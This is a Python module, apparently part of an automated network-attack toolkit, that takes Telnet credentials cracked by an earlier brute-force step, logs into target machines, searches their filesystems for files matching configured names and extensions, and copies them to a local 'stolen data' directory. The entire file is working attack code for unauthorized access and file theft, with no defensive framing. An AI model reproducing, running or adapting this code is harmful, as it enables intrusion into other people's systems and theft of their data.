"""
steal_files_telnet.py - This script connects to remote Telnet servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import telnetlib
import logging
import time
from shared import SharedData
from logger import Logger
from timeout_utils import TimeoutContext

# Configure the logger
logger = Logger(name="steal_files_telnet.py", level=logging.INFO)

# Define the necessary global variables
b_class = "StealFilesTelnet"
b_module = "steal_files_telnet"
b_status = "steal_files_telnet"
b_parent = "TelnetBruteforce"
b_port = 23

class StealFilesTelnet:
    """
    Class to handle the process of stealing files from Telnet servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.telnet_connected = False
            self.stop_execution = False
            self.b_parent_action = "brute_force_telnet"  # Parent action status key
            logger.info("StealFilesTelnet initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    # Common shell prompts to detect
    PROMPT_PATTERNS = [b"$ ", b"# ", b"> ", b"% ", b"$\n", b"#\n", b">\n", b"%\n"]

    def _read_until_prompt(self, tn, timeout=10):
        """Read until we see a shell prompt."""
        import re
        try:
            # Read with regex matching common prompts
            idx, match, data = tn.expect([rb'[\$#>%]\s*$', rb'[\$#>%]\s*\n'], timeout=timeout)
            return data
        except:
            return tn.read_very_eager()

    def _read_until_marker(self, tn, marker, timeout=30, stale_timeout=30):
        """Read until we see a specific marker string, with timeout. Returns whatever data collected.

        Args:
            tn: Telnet connection
            marker: Byte string marker to look for
            timeout: Maximum total time to wait (seconds)
            stale_timeout: Give up if no new data received for this long (seconds)
        """
        import time
        start = time.time()
        data = b""
        last_log = start
        last_logged_size = 0
        last_data_time = start  # Track when we last received data

        while time.time() - start < timeout:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Read interrupted by orchestrator exit")
                break
            try:
                chunk = tn.read_very_eager()
                if chunk:
                    data += chunk
                    last_data_time = time.time()  # Reset stale timer
                    if marker in data:
                        logger.debug(f"Found marker after {time.time()-start:.1f}s, {len(data)} bytes")
                        break
                else:
                    time.sleep(0.1)
                    # Check for stale connection (no data for stale_timeout seconds)
                    if time.time() - last_data_time > stale_timeout:
                        logger.info(f"No new data for {stale_timeout}s, giving up")
                        break
                # Log progress every 30 seconds, but only if new data arrived
                if time.time() - last_log > 30 and len(data) > last_logged_size:
                    logger.info(f"Reading telnet output... {len(data)} bytes so far")
                    last_log = time.time()
                    last_logged_size = len(data)
            except Exception as e:
                logger.debug(f"Read error: {e}")
                break

        elapsed = time.time() - start
        if marker not in data:
            logger.warning(f"Read timed out after {elapsed:.1f}s with {len(data)} bytes (marker not found)")
        return data.decode('ascii', errors='ignore')

    def connect_telnet(self, ip, username, password):
        """
        Establish a Telnet connection with flexible prompt detection.
        """
        try:
            tn = telnetlib.Telnet(ip, timeout=30)
            # Wait for login prompt (various formats)
            tn.read_until(b":", timeout=10)  # Most prompts end with ":"
            tn.write(username.encode('ascii') + b"\n")
            if password:
                # Wait for password prompt
                tn.read_until(b":", timeout=10)
                tn.write(password.encode('ascii') + b"\n")
            # Wait for shell prompt
            self._read_until_prompt(tn, timeout=10)
            self.telnet_connected = True
            logger.info(f"Connected to {ip} via Telnet as {username}")
            return tn
        except Exception as e:
            logger.debug(f"Telnet connection error for {ip}: {e}")
            return None

    def save_file_listing(self, ip, mac, files, protocol="telnet"):
        """
        Save the complete file listing to a recon file for later analysis.
        """
        try:
            recon_dir = os.path.join(self.shared_data.datastolendir, "recon", "file_listings")
            os.makedirs(recon_dir, exist_ok=True)
            listing_file = os.path.join(recon_dir, f"{protocol}_{mac}_{ip}_files.txt")
            with open(listing_file, 'w') as f:
                f.write(f"# File listing for {ip} via {protocol.upper()}\n")
                f.write(f"# Total files discovered: {len(files)}\n")
                f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("#" + "=" * 60 + "\n")
                for file in sorted(files):
                    f.write(f"{file}\n")
            logger.info(f"Saved file listing ({len(files)} files)")
        except Exception as e:
            logger.error(f"Error saving file listing: {e}")

    def find_files(self, tn, dir_path, ip=None, mac=None):
        """
        Find files in the remote directory based on the config criteria.
        Saves full file listing to recon directory.
        Times out after 5 minutes and uses partial results if incomplete.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                return []
            # Use marker-based read with 5 minute timeout
            find_timeout = 300  # 5 minutes max for file discovery
            logger.info(f"Starting file discovery on {ip} (max {find_timeout}s)...")
            # Exclude virtual filesystems (proc/sys/dev) which have thousands of kernel files
            tn.write(f'find {dir_path} -maxdepth 5 -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null; echo "FIND_DONE"\n'.encode('ascii'))
            raw_output = self._read_until_marker(tn, b"FIND_DONE", timeout=find_timeout)

            # Check if we got the complete marker or timed out
            find_complete = "FIND_DONE" in raw_output
            raw_output = raw_output.replace("FIND_DONE", "")

            # Filter out the command itself and empty lines
            all_files = []
            for line in raw_output.splitlines():
                line = line.strip()
                # Skip command echo, empty lines, and prompts (ends with $ # > %)
                if line and not line.startswith('find ') and line.startswith('/'):
                    # Remove trailing prompt characters if any
                    if line[-1] in '$#>%':
                        line = line[:-1].strip()
                    if line:
                        all_files.append(line)

            # Save file listing (complete or partial) for recon
            if ip and mac and all_files:
                self.save_file_listing(ip, mac, all_files, "telnet")

            if find_complete:
                logger.info(f"Discovered {len(all_files)} total files on {ip or 'target'}")
            else:
                logger.warning(f"File discovery timed out after {find_timeout}s - using partial results ({len(all_files)} files found so far)")

            # Filter for matching files - pre-compile patterns for speed
            steal_extensions = set(self.shared_data.steal_file_extensions)
            steal_names = set(self.shared_data.steal_file_names)
            path_patterns = [fn for fn in steal_names if fn.startswith('/')]
            name_patterns = set(fn for fn in steal_names if not fn.startswith('/'))

            matching_files = []
            for i, file in enumerate(all_files):
                # Check for exit every 1000 files instead of every file
                if i % 1000 == 0 and self.shared_data.orchestrator_should_exit:
                    logger.info(f"File filtering interrupted at {i}/{len(all_files)} files.")
                    break
                basename = os.path.basename(file)
                # Match by extension
                if any(file.endswith(ext) for ext in steal_extensions):
                    matching_files.append(file)
                # Match by path pattern (ends with /pattern)
                elif any(file.endswith(fn) for fn in path_patterns):
                    matching_files.append(file)
                # Match by basename
                elif basename in name_patterns:
                    matching_files.append(file)
            logger.info(f"Found {len(matching_files)} matching files to steal")
            return matching_files
        except Exception as e:
            logger.error(f"Error finding files on Telnet: {e}")
            return []

    def steal_file(self, tn, remote_file, local_dir):
        """
        Download a file from the remote server to the local directory.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                return
            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                tn.write(f'cat {remote_file}\n'.encode('ascii'))
                data = self._read_until_prompt(tn, timeout=10)
                # Remove the command echo from the beginning if present
                lines = data.split(b'\n', 1)
                if len(lines) > 1:
                    data = lines[1]
                f.write(data)
            logger.success(f"Downloaded: {os.path.basename(remote_file)}")
        except Exception as e:
            logger.debug(f"Error downloading {remote_file}: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using Telnet.
        """
        # Reset state from any previous runs
        self.stop_execution = False
        self.telnet_connected = False

        start_time = time.time()
        logger.lifecycle_start("StealFilesTelnet", ip, port)
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesTelnet"
                logger.info(f"Stealing files from {ip}:{port}...")
                # Get Telnet credentials from the cracked passwords file
                telnetfile = self.shared_data.telnetfile
                credentials = []
                if os.path.exists(telnetfile):
                    with open(telnetfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            line = line.strip()
                            if not line:  # Skip empty lines
                                continue
                            parts = line.split(',')
                            if len(parts) >= 5 and parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.info(f"No credentials for {ip}")
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealFilesTelnet", 'no_creds', duration, ip)
                    return 'failed'

                def handle_timeout():
                    """
                    Timeout handler to stop the execution if no Telnet connection is established.
                    """
                    if not self.telnet_connected:
                        logger.lifecycle_timeout("StealFilesTelnet", "Telnet connection", 240, ip)
                        self.stop_execution = True

                # Use TimeoutContext instead of Timer(240)
                with TimeoutContext(timeout=240, on_timeout=handle_timeout) as timeout_ctx:
                    # Attempt to steal files using each credential
                    files_stolen = False
                    connected = False
                    interrupted = False
                    files_found = 0
                    mac = row['MAC Address']
                    for username, password in credentials:
                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                            logger.info("Steal files execution interrupted due to orchestrator exit.")
                            interrupted = True
                            break
                        try:
                            tn = self.connect_telnet(ip, username, password)
                            if tn:
                                connected = True
                                remote_files = self.find_files(tn, '/', ip, mac)
                                files_found = len(remote_files) if remote_files else 0
                                local_dir = os.path.join(self.shared_data.datastolendir, f"telnet/{mac}_{ip}")
                                if remote_files:
                                    stolen_count = 0
                                    for remote_file in remote_files:
                                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                            logger.info(f"File stealing interrupted after {stolen_count}/{len(remote_files)} files.")
                                            interrupted = True
                                            break
                                        self.steal_file(tn, remote_file, local_dir)
                                        stolen_count += 1
                                    if stolen_count > 0:
                                        files_stolen = True
                                        logger.success(f"Successfully stolen {stolen_count}/{len(remote_files)} files from {ip}:{port} using {username}")
                                tn.close()
                                if files_stolen:
                                    duration = time.time() - start_time
                                    logger.lifecycle_end("StealFilesTelnet", 'success', duration, ip)
                                    return 'success'
                        except Exception as e:
                            logger.debug(f"Error stealing files from {ip} with user '{username}': {e}")

                duration = time.time() - start_time
                if interrupted:
                    # Was interrupted - report what happened
                    if files_found > 0:
                        logger.warning(f"Interrupted before stealing {files_found} matching files on {ip}:{port}")
                    logger.lifecycle_end("StealFilesTelnet", 'interrupted', duration, ip)
                    return 'failed'
                elif connected:
                    # Connected successfully but no matching files found - not a failure
                    logger.info(f"No matching files found on {ip}:{port}")
                    logger.lifecycle_end("StealFilesTelnet", 'success', duration, ip)
                    return 'success'
                else:
                    # Failed to connect with any credentials
                    logger.error(f"Failed to connect to Telnet on {ip}:{port}")
                    logger.lifecycle_end("StealFilesTelnet", 'failed', duration, ip)
                    return 'failed'
            else:
                logger.info(f"Skipping {ip} - no successful brute force")
                duration = time.time() - start_time
                logger.lifecycle_end("StealFilesTelnet", 'skipped', duration, ip)
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            duration = time.time() - start_time
            logger.lifecycle_end("StealFilesTelnet", 'failed', duration, ip)
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_telnet = StealFilesTelnet(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
